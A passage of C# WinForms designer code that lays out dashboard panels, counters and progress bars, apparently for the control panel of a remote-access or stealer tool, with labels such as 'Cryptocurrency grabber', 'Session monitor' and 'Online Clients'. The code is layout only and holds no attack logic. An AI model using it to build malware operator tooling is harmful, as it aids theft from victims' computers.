        this.bunifuGradientPanel3.GradientBottomLeft = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.bunifuGradientPanel3.GradientBottomRight = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.bunifuGradientPanel3.GradientTopLeft = System.Drawing.Color.FromArgb(((int)(((byte)(192)))), ((int)(((byte)(0)))), ((int)(((byte)(192)))));
        this.bunifuGradientPanel3.GradientTopRight = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.bunifuGradientPanel3.Location = new System.Drawing.Point(505, 325);
        this.bunifuGradientPanel3.Name = "bunifuGradientPanel3";
        this.bunifuGradientPanel3.Quality = 10;
        this.bunifuGradientPanel3.Size = new System.Drawing.Size(418, 150);
        this.bunifuGradientPanel3.TabIndex = 597;
        // 
        // pictureBox9
        // 
        this.pictureBox9.BackColor = System.Drawing.Color.Transparent;
        this.pictureBox9.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox9.Image")));
        this.pictureBox9.Location = new System.Drawing.Point(13, 11);
        this.pictureBox9.Name = "pictureBox9";
        this.pictureBox9.Size = new System.Drawing.Size(123, 127);
        this.pictureBox9.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
        this.pictureBox9.TabIndex = 591;
        this.pictureBox9.TabStop = false;
        // 
        // CountReceivedData
        // 
        this.CountReceivedData.AllowParentOverrides = false;
        this.CountReceivedData.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
        this.CountReceivedData.AutoEllipsis = false;
        this.CountReceivedData.AutoSize = false;
        this.CountReceivedData.CursorType = null;
        this.CountReceivedData.Font = new System.Drawing.Font("Segoe UI Semibold", 10.75F, System.Drawing.FontStyle.Bold);
        this.CountReceivedData.ForeColor = System.Drawing.Color.White;
        this.CountReceivedData.Location = new System.Drawing.Point(297, 119);
        this.CountReceivedData.Name = "CountReceivedData";
        this.CountReceivedData.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.CountReceivedData.Size = new System.Drawing.Size(85, 17);
        this.CountReceivedData.TabIndex = 590;
        this.CountReceivedData.Text = "845KB";
        this.CountReceivedData.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
        this.CountReceivedData.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        // 
        // ProgressBarReceivedData
        // 
        this.ProgressBarReceivedData.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
        this.ProgressBarReceivedData.BackColor = System.Drawing.Color.Transparent;
        this.ProgressBarReceivedData.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
        this.ProgressBarReceivedData.FillOffset = 12;
        this.ProgressBarReceivedData.FillThickness = 1;
        this.ProgressBarReceivedData.Font = new System.Drawing.Font("Consolas", 11.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
        this.ProgressBarReceivedData.ForeColor = System.Drawing.Color.White;
        this.ProgressBarReceivedData.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
        this.ProgressBarReceivedData.Location = new System.Drawing.Point(297, 10);
        this.ProgressBarReceivedData.Maximum = 50000;
        this.ProgressBarReceivedData.Name = "ProgressBarReceivedData";
        this.ProgressBarReceivedData.ProgressColor = System.Drawing.Color.White;
        this.ProgressBarReceivedData.ProgressColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
        this.ProgressBarReceivedData.ProgressEndCap = System.Drawing.Drawing2D.LineCap.Round;
        this.ProgressBarReceivedData.ProgressOffset = 8;
        this.ProgressBarReceivedData.ProgressStartCap = System.Drawing.Drawing2D.LineCap.Round;
        this.ProgressBarReceivedData.ProgressThickness = 6;
        this.ProgressBarReceivedData.ShadowDecoration.Parent = this.ProgressBarReceivedData;
        this.ProgressBarReceivedData.ShowPercentage = true;
        this.ProgressBarReceivedData.Size = new System.Drawing.Size(80, 80);
        this.ProgressBarReceivedData.TabIndex = 589;
        this.ProgressBarReceivedData.Value = 38000;
        // 
        // bunifuLabel95
        // 
        this.bunifuLabel95.AllowParentOverrides = false;
        this.bunifuLabel95.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
        this.bunifuLabel95.AutoEllipsis = false;
        this.bunifuLabel95.AutoSize = false;
        this.bunifuLabel95.CursorType = null;
        this.bunifuLabel95.Font = new System.Drawing.Font("Segoe UI Semibold", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
        this.bunifuLabel95.ForeColor = System.Drawing.Color.DarkGray;
        this.bunifuLabel95.Location = new System.Drawing.Point(282, 96);
        this.bunifuLabel95.Name = "bunifuLabel95";
        this.bunifuLabel95.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.bunifuLabel95.Size = new System.Drawing.Size(116, 17);
        this.bunifuLabel95.TabIndex = 588;
        this.bunifuLabel95.Text = "Data Received";
        this.bunifuLabel95.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
        this.bunifuLabel95.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        // 
        // CountSentData
        // 
        this.CountSentData.AllowParentOverrides = false;
        this.CountSentData.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
        this.CountSentData.AutoEllipsis = false;
        this.CountSentData.AutoSize = false;
        this.CountSentData.CursorType = null;
        this.CountSentData.Font = new System.Drawing.Font("Segoe UI Semibold", 10.75F, System.Drawing.FontStyle.Bold);
        this.CountSentData.ForeColor = System.Drawing.Color.White;
        this.CountSentData.Location = new System.Drawing.Point(162, 119);
        this.CountSentData.Name = "CountSentData";
        this.CountSentData.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.CountSentData.Size = new System.Drawing.Size(80, 17);
        this.CountSentData.TabIndex = 587;
        this.CountSentData.Text = "954KB";
        this.CountSentData.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
        this.CountSentData.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        // 
        // ProgressBarDataSent
        // 
        this.ProgressBarDataSent.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
        this.ProgressBarDataSent.BackColor = System.Drawing.Color.Transparent;
        this.ProgressBarDataSent.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
        this.ProgressBarDataSent.FillOffset = 12;
        this.ProgressBarDataSent.FillThickness = 1;
        this.ProgressBarDataSent.Font = new System.Drawing.Font("Consolas", 11.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
        this.ProgressBarDataSent.ForeColor = System.Drawing.Color.White;
        this.ProgressBarDataSent.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
        this.ProgressBarDataSent.Location = new System.Drawing.Point(162, 10);
        this.ProgressBarDataSent.Maximum = 50000;
        this.ProgressBarDataSent.Name = "ProgressBarDataSent";
        this.ProgressBarDataSent.ProgressColor = System.Drawing.Color.White;
        this.ProgressBarDataSent.ProgressColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
        this.ProgressBarDataSent.ProgressEndCap = System.Drawing.Drawing2D.LineCap.Round;
        this.ProgressBarDataSent.ProgressOffset = 8;
        this.ProgressBarDataSent.ProgressStartCap = System.Drawing.Drawing2D.LineCap.Round;
        this.ProgressBarDataSent.ProgressThickness = 6;
        this.ProgressBarDataSent.ShadowDecoration.Parent = this.ProgressBarDataSent;
        this.ProgressBarDataSent.ShowPercentage = true;
        this.ProgressBarDataSent.Size = new System.Drawing.Size(80, 80);
        this.ProgressBarDataSent.TabIndex = 568;
        this.ProgressBarDataSent.Value = 23000;
        // 
        // bunifuLabel14
        // 
        this.bunifuLabel14.AllowParentOverrides = false;
        this.bunifuLabel14.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
        this.bunifuLabel14.AutoEllipsis = false;
        this.bunifuLabel14.AutoSize = false;
        this.bunifuLabel14.CursorType = null;
        this.bunifuLabel14.Font = new System.Drawing.Font("Segoe UI Semibold", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
        this.bunifuLabel14.ForeColor = System.Drawing.Color.DarkGray;
        this.bunifuLabel14.Location = new System.Drawing.Point(162, 96);
        this.bunifuLabel14.Name = "bunifuLabel14";
        this.bunifuLabel14.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.bunifuLabel14.Size = new System.Drawing.Size(80, 17);
        this.bunifuLabel14.TabIndex = 30;
        this.bunifuLabel14.Text = "Data Sent";
        this.bunifuLabel14.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
        this.bunifuLabel14.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        // 
        // bunifuPanel5
        // 
        this.bunifuPanel5.Anchor = System.Windows.Forms.AnchorStyles.None;
        this.bunifuPanel5.BackgroundColor = System.Drawing.Color.Green;
        this.bunifuPanel5.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("bunifuPanel5.BackgroundImage")));
        this.bunifuPanel5.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.bunifuPanel5.BorderColor = System.Drawing.Color.Green;
        this.bunifuPanel5.BorderRadius = 30;
        this.bunifuPanel5.BorderThickness = 1;
        this.bunifuPanel5.Controls.Add(this.CountSessionMonitor);
        this.bunifuPanel5.Controls.Add(this.guna2GradientButton_0);
        this.bunifuPanel5.Controls.Add(this.label3);
        this.bunifuPanel5.Location = new System.Drawing.Point(717, 265);
        this.bunifuPanel5.Name = "bunifuPanel5";
        this.bunifuPanel5.ShowBorders = true;
        this.bunifuPanel5.Size = new System.Drawing.Size(206, 54);
        this.bunifuPanel5.TabIndex = 596;
        // 
        // CountSessionMonitor
        // 
        this.CountSessionMonitor.AllowParentOverrides = false;
        this.CountSessionMonitor.AutoEllipsis = false;
        this.CountSessionMonitor.CursorType = null;
        this.CountSessionMonitor.Font = new System.Drawing.Font("Segoe UI", 12F, System.Drawing.FontStyle.Bold);
        this.CountSessionMonitor.ForeColor = System.Drawing.Color.White;
        this.CountSessionMonitor.Location = new System.Drawing.Point(61, 27);
        this.CountSessionMonitor.Name = "CountSessionMonitor";
        this.CountSessionMonitor.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.CountSessionMonitor.Size = new System.Drawing.Size(9, 21);
        this.CountSessionMonitor.TabIndex = 589;
        this.CountSessionMonitor.Text = "0";
        this.CountSessionMonitor.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.CountSessionMonitor.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        // 
        // guna2GradientButton_0
        // 
        this.guna2GradientButton_0.Animated = true;
        this.guna2GradientButton_0.AutoRoundedCorners = true;
        this.guna2GradientButton_0.BackColor = System.Drawing.Color.Transparent;
        this.guna2GradientButton_0.BorderRadius = 19;
        this.guna2GradientButton_0.CheckedState.BorderColor = System.Drawing.Color.White;
        this.guna2GradientButton_0.CheckedState.CustomBorderColor = System.Drawing.Color.White;
        this.guna2GradientButton_0.CheckedState.FillColor = System.Drawing.Color.White;
        this.guna2GradientButton_0.CheckedState.FillColor2 = System.Drawing.Color.White;
        this.guna2GradientButton_0.CheckedState.ForeColor = System.Drawing.Color.White;
        this.guna2GradientButton_0.CheckedState.Parent = this.guna2GradientButton_0;
        this.guna2GradientButton_0.Cursor = System.Windows.Forms.Cursors.Hand;
        this.guna2GradientButton_0.CustomImages.Parent = this.guna2GradientButton_0;
        this.guna2GradientButton_0.FillColor = System.Drawing.Color.White;
        this.guna2GradientButton_0.FillColor2 = System.Drawing.Color.White;
        this.guna2GradientButton_0.Font = new System.Drawing.Font("Consolas", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
        this.guna2GradientButton_0.ForeColor = System.Drawing.SystemColors.InfoText;
        this.guna2GradientButton_0.HoverState.Parent = this.guna2GradientButton_0;
        this.guna2GradientButton_0.Image = ((System.Drawing.Image)(resources.GetObject("guna2GradientButton_0.Image")));
        this.guna2GradientButton_0.ImageSize = new System.Drawing.Size(32, 32);
        this.guna2GradientButton_0.Location = new System.Drawing.Point(7, 7);
        this.guna2GradientButton_0.Name = "guna2GradientButton_0";
        this.guna2GradientButton_0.ShadowDecoration.Parent = this.guna2GradientButton_0;
        this.guna2GradientButton_0.Size = new System.Drawing.Size(43, 41);
        this.guna2GradientButton_0.TabIndex = 578;
        // 
        // label3
        // 
        this.label3.AutoSize = true;
        this.label3.BackColor = System.Drawing.Color.Transparent;
        this.label3.Font = new System.Drawing.Font("Segoe UI Semibold", 9F, System.Drawing.FontStyle.Bold);
        this.label3.ForeColor = System.Drawing.Color.White;
        this.label3.Location = new System.Drawing.Point(56, 7);
        this.label3.Name = "label3";
        this.label3.Size = new System.Drawing.Size(93, 15);
        this.label3.TabIndex = 588;
        this.label3.Text = "Session monitor";
        // 
        // bunifuPanel11
        // 
        this.bunifuPanel11.Anchor = System.Windows.Forms.AnchorStyles.None;
        this.bunifuPanel11.BackgroundColor = System.Drawing.Color.FromArgb(((int)(((byte)(249)))), ((int)(((byte)(205)))), ((int)(((byte)(11)))));
        this.bunifuPanel11.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("bunifuPanel11.BackgroundImage")));
        this.bunifuPanel11.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.bunifuPanel11.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(249)))), ((int)(((byte)(205)))), ((int)(((byte)(11)))));
        this.bunifuPanel11.BorderRadius = 30;
        this.bunifuPanel11.BorderThickness = 1;
        this.bunifuPanel11.Controls.Add(this.CountGrabber);
        this.bunifuPanel11.Controls.Add(this.guna2GradientButton_1);
        this.bunifuPanel11.Controls.Add(this.label4);
        this.bunifuPanel11.Location = new System.Drawing.Point(505, 265);
        this.bunifuPanel11.Name = "bunifuPanel11";
        this.bunifuPanel11.ShowBorders = true;
        this.bunifuPanel11.Size = new System.Drawing.Size(206, 54);
        this.bunifuPanel11.TabIndex = 594;
        // 
        // CountGrabber
        // 
        this.CountGrabber.AllowParentOverrides = false;
        this.CountGrabber.AutoEllipsis = false;
        this.CountGrabber.CursorType = null;
        this.CountGrabber.Font = new System.Drawing.Font("Segoe UI", 12F, System.Drawing.FontStyle.Bold);
        this.CountGrabber.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
        this.CountGrabber.Location = new System.Drawing.Point(61, 27);
        this.CountGrabber.Name = "CountGrabber";
        this.CountGrabber.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.CountGrabber.Size = new System.Drawing.Size(9, 21);
        this.CountGrabber.TabIndex = 589;
        this.CountGrabber.Text = "0";
        this.CountGrabber.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.CountGrabber.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        // 
        // guna2GradientButton_1
        // 
        this.guna2GradientButton_1.Animated = true;
        this.guna2GradientButton_1.AutoRoundedCorners = true;
        this.guna2GradientButton_1.BackColor = System.Drawing.Color.Transparent;
        this.guna2GradientButton_1.BorderRadius = 20;
        this.guna2GradientButton_1.CheckedState.BorderColor = System.Drawing.Color.White;
        this.guna2GradientButton_1.CheckedState.CustomBorderColor = System.Drawing.Color.White;
        this.guna2GradientButton_1.CheckedState.FillColor = System.Drawing.Color.White;
        this.guna2GradientButton_1.CheckedState.FillColor2 = System.Drawing.Color.White;
        this.guna2GradientButton_1.CheckedState.ForeColor = System.Drawing.Color.White;
        this.guna2GradientButton_1.CheckedState.Parent = this.guna2GradientButton_1;
        this.guna2GradientButton_1.Cursor = System.Windows.Forms.Cursors.Hand;
        this.guna2GradientButton_1.CustomImages.Parent = this.guna2GradientButton_1;
        this.guna2GradientButton_1.FillColor = System.Drawing.Color.White;
        this.guna2GradientButton_1.FillColor2 = System.Drawing.Color.White;
        this.guna2GradientButton_1.Font = new System.Drawing.Font("Consolas", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
        this.guna2GradientButton_1.ForeColor = System.Drawing.SystemColors.InfoText;
        this.guna2GradientButton_1.HoverState.Parent = this.guna2GradientButton_1;
        this.guna2GradientButton_1.Image = ((System.Drawing.Image)(resources.GetObject("guna2GradientButton_1.Image")));
        this.guna2GradientButton_1.ImageSize = new System.Drawing.Size(32, 32);
        this.guna2GradientButton_1.Location = new System.Drawing.Point(7, 5);
        this.guna2GradientButton_1.Name = "guna2GradientButton_1";
        this.guna2GradientButton_1.ShadowDecoration.Parent = this.guna2GradientButton_1;
        this.guna2GradientButton_1.Size = new System.Drawing.Size(43, 43);
        this.guna2GradientButton_1.TabIndex = 578;
        // 
        // label4
        // 
        this.label4.AutoSize = true;
        this.label4.BackColor = System.Drawing.Color.Transparent;
        this.label4.Font = new System.Drawing.Font("Segoe UI Semibold", 9F, System.Drawing.FontStyle.Bold);
        this.label4.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
        this.label4.Location = new System.Drawing.Point(56, 7);
        this.label4.Name = "label4";
        this.label4.Size = new System.Drawing.Size(132, 15);
        this.label4.TabIndex = 588;
        this.label4.Text = "Cryptocurrency grabber";
        // 
        // bunifuGradientPanel1
        // 
        this.bunifuGradientPanel1.Anchor = System.Windows.Forms.AnchorStyles.None;
        this.bunifuGradientPanel1.BackColor = System.Drawing.Color.Transparent;
        this.bunifuGradientPanel1.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("bunifuGradientPanel1.BackgroundImage")));
        this.bunifuGradientPanel1.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.bunifuGradientPanel1.BorderRadius = 30;
        this.bunifuGradientPanel1.Controls.Add(this.guna2PictureBox1);
        this.bunifuGradientPanel1.Controls.Add(this.label5);
        this.bunifuGradientPanel1.Controls.Add(this.label11);
        this.bunifuGradientPanel1.Controls.Add(this.CountClients);
        this.bunifuGradientPanel1.Controls.Add(this.CountDesconnect);
        this.bunifuGradientPanel1.Controls.Add(this.CountNewClient);
        this.bunifuGradientPanel1.Controls.Add(this.label8);
        this.bunifuGradientPanel1.Controls.Add(this.guna2Button5);
        this.bunifuGradientPanel1.Controls.Add(this.guna2Button6);
        this.bunifuGradientPanel1.Controls.Add(this.bunifuLabel16);
        this.bunifuGradientPanel1.Controls.Add(this.bunifuLabel35);
        this.bunifuGradientPanel1.GradientBottomLeft = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.bunifuGradientPanel1.GradientBottomRight = System.Drawing.Color.FromArgb(((int)(((byte)(135)))), ((int)(((byte)(16)))), ((int)(((byte)(255)))));
        this.bunifuGradientPanel1.GradientTopLeft = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.bunifuGradientPanel1.GradientTopRight = System.Drawing.Color.FromArgb(((int)(((byte)(135)))), ((int)(((byte)(16)))), ((int)(((byte)(255)))));
        this.bunifuGradientPanel1.Location = new System.Drawing.Point(505, 18);
        this.bunifuGradientPanel1.Name = "bunifuGradientPanel1";
        this.bunifuGradientPanel1.Quality = 10;
        this.bunifuGradientPanel1.Size = new System.Drawing.Size(418, 241);
        this.bunifuGradientPanel1.TabIndex = 593;
        // 
        // guna2PictureBox1
        // 
        this.guna2PictureBox1.BackColor = System.Drawing.Color.Transparent;
        this.guna2PictureBox1.Image = ((System.Drawing.Image)(resources.GetObject("guna2PictureBox1.Image")));
        this.guna2PictureBox1.Location = new System.Drawing.Point(234, 12);
        this.guna2PictureBox1.Name = "guna2PictureBox1";
        this.guna2PictureBox1.ShadowDecoration.Parent = this.guna2PictureBox1;
        this.guna2PictureBox1.Size = new System.Drawing.Size(168, 172);
        this.guna2PictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
        this.guna2PictureBox1.TabIndex = 592;
        this.guna2PictureBox1.TabStop = false;
        this.guna2PictureBox1.UseTransparentBackground = true;
        // 
        // label5
        // 
        this.label5.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
        this.label5.AutoSize = true;
        this.label5.BackColor = System.Drawing.Color.Transparent;
        this.label5.Font = new System.Drawing.Font("Segoe UI Semibold", 9.25F, System.Drawing.FontStyle.Bold);
        this.label5.ForeColor = System.Drawing.Color.White;
        this.label5.Location = new System.Drawing.Point(10, 4);
        this.label5.Name = "label5";
        this.label5.Size = new System.Drawing.Size(92, 17);
        this.label5.TabIndex = 587;
        this.label5.Text = "Clients Details";
        // 
        // label11
        // 
        this.label11.AutoSize = true;
        this.label11.BackColor = System.Drawing.Color.Transparent;
        this.label11.Font = new System.Drawing.Font("Segoe UI Semibold", 9.25F, System.Drawing.FontStyle.Bold);
        this.label11.ForeColor = System.Drawing.Color.Silver;
        this.label11.Location = new System.Drawing.Point(81, 195);
        this.label11.Name = "label11";
        this.label11.Size = new System.Drawing.Size(74, 17);
        this.label11.TabIndex = 586;
        this.label11.Text = "Disconnect";
        // 
        // CountClients
        // 
        this.CountClients.AutoSize = true;
        this.CountClients.BackColor = System.Drawing.Color.Transparent;
        this.CountClients.Font = new System.Drawing.Font("Segoe UI", 36F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
        this.CountClients.ForeColor = System.Drawing.Color.White;
        this.CountClients.Location = new System.Drawing.Point(26, 42);
        this.CountClients.Name = "CountClients";
        this.CountClients.Size = new System.Drawing.Size(90, 65);
        this.CountClients.TabIndex = 554;
        this.CountClients.Text = "0+";
        this.CountClients.TextChanged += new System.EventHandler(this.CountClients_TextChanged);
        // 
        // CountDesconnect
        // 
        this.CountDesconnect.AllowParentOverrides = false;
        this.CountDesconnect.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
        this.CountDesconnect.AutoEllipsis = false;
        this.CountDesconnect.CursorType = null;
        this.CountDesconnect.Font = new System.Drawing.Font("Segoe UI", 12F, System.Drawing.FontStyle.Bold);
        this.CountDesconnect.ForeColor = System.Drawing.Color.White;
        this.CountDesconnect.Location = new System.Drawing.Point(84, 212);
        this.CountDesconnect.Name = "CountDesconnect";
        this.CountDesconnect.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.CountDesconnect.Size = new System.Drawing.Size(9, 21);
        this.CountDesconnect.TabIndex = 509;
        this.CountDesconnect.Text = "0";
        this.CountDesconnect.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.CountDesconnect.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        // 
        // CountNewClient
        // 
        this.CountNewClient.AllowParentOverrides = false;
        this.CountNewClient.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
        this.CountNewClient.AutoEllipsis = false;
        this.CountNewClient.CursorType = null;
        this.CountNewClient.Font = new System.Drawing.Font("Segoe UI", 12F, System.Drawing.FontStyle.Bold);
        this.CountNewClient.ForeColor = System.Drawing.Color.White;
        this.CountNewClient.Location = new System.Drawing.Point(84, 166);
        this.CountNewClient.Name = "CountNewClient";
        this.CountNewClient.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.CountNewClient.Size = new System.Drawing.Size(9, 21);
        this.CountNewClient.TabIndex = 509;
        this.CountNewClient.Text = "0";
        this.CountNewClient.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.CountNewClient.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        // 
        // label8
        // 
        this.label8.AutoSize = true;
        this.label8.BackColor = System.Drawing.Color.Transparent;
        this.label8.Font = new System.Drawing.Font("Segoe UI Semibold", 9.25F, System.Drawing.FontStyle.Bold);
        this.label8.ForeColor = System.Drawing.Color.Silver;
        this.label8.Location = new System.Drawing.Point(81, 148);
        this.label8.Name = "label8";
        this.label8.Size = new System.Drawing.Size(73, 17);
        this.label8.TabIndex = 584;
        this.label8.Text = "New Client";
        // 
        // guna2Button5
        // 
        this.guna2Button5.BackColor = System.Drawing.Color.Transparent;
        this.guna2Button5.BorderRadius = 5;
        this.guna2Button5.CheckedState.Parent = this.guna2Button5;
        this.guna2Button5.CustomImages.Parent = this.guna2Button5;
        this.guna2Button5.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(193)))), ((int)(((byte)(0)))));
        this.guna2Button5.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.guna2Button5.ForeColor = System.Drawing.Color.White;
        this.guna2Button5.HoverState.Parent = this.guna2Button5;
        this.guna2Button5.Image = ((System.Drawing.Image)(resources.GetObject("guna2Button5.Image")));
        this.guna2Button5.Location = new System.Drawing.Point(32, 153);
        this.guna2Button5.Name = "guna2Button5";
        this.guna2Button5.ShadowDecoration.Parent = this.guna2Button5;
        this.guna2Button5.Size = new System.Drawing.Size(42, 34);
        this.guna2Button5.TabIndex = 582;
        // 
        // guna2Button6
        // 
        this.guna2Button6.BackColor = System.Drawing.Color.Transparent;
        this.guna2Button6.BorderRadius = 5;
        this.guna2Button6.CheckedState.Parent = this.guna2Button6;
        this.guna2Button6.CustomImages.Parent = this.guna2Button6;
        this.guna2Button6.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(254)))), ((int)(((byte)(64)))), ((int)(((byte)(48)))));
        this.guna2Button6.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.guna2Button6.ForeColor = System.Drawing.Color.White;
        this.guna2Button6.HoverState.Parent = this.guna2Button6;
        this.guna2Button6.Image = ((System.Drawing.Image)(resources.GetObject("guna2Button6.Image")));
        this.guna2Button6.Location = new System.Drawing.Point(33, 199);
        this.guna2Button6.Name = "guna2Button6";
        this.guna2Button6.ShadowDecoration.Parent = this.guna2Button6;
        this.guna2Button6.Size = new System.Drawing.Size(42, 34);
        this.guna2Button6.TabIndex = 583;
        // 
        // bunifuLabel16
        // 
        this.bunifuLabel16.AllowParentOverrides = false;
        this.bunifuLabel16.AutoEllipsis = false;
        this.bunifuLabel16.CursorType = null;
        this.bunifuLabel16.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.25F);
        this.bunifuLabel16.ForeColor = System.Drawing.Color.White;
        this.bunifuLabel16.Location = new System.Drawing.Point(37, 110);
        this.bunifuLabel16.Name = "bunifuLabel16";
        this.bunifuLabel16.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.bunifuLabel16.Size = new System.Drawing.Size(76, 15);
        this.bunifuLabel16.TabIndex = 30;
        this.bunifuLabel16.Text = "Online Clients";
        this.bunifuLabel16.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.bunifuLabel16.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        // 
        // bunifuLabel35
        // 
        this.bunifuLabel35.AllowParentOverrides = false;
        this.bunifuLabel35.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
        this.bunifuLabel35.AutoEllipsis = false;
        this.bunifuLabel35.CursorType = null;
        this.bunifuLabel35.Font = new System.Drawing.Font("Segoe UI Semibold", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
        this.bunifuLabel35.ForeColor = System.Drawing.Color.DarkGray;
        this.bunifuLabel35.Location = new System.Drawing.Point(288, 218);
        this.bunifuLabel35.Name = "bunifuLabel35";
        this.bunifuLabel35.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.bunifuLabel35.Size = new System.Drawing.Size(114, 17);
        this.bunifuLabel35.TabIndex = 30;
        this.bunifuLabel35.Text = "Brief Clients details";
        this.bunifuLabel35.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.bunifuLabel35.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        // 
        // bunifuPanel4
        // 
        this.bunifuPanel4.Anchor = System.Windows.Forms.AnchorStyles.None;
        this.bunifuPanel4.BackgroundColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.bunifuPanel4.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("bunifuPanel4.BackgroundImage")));
        this.bunifuPanel4.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.bunifuPanel4.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.bunifuPanel4.BorderRadius = 30;
        this.bunifuPanel4.BorderThickness = 1;
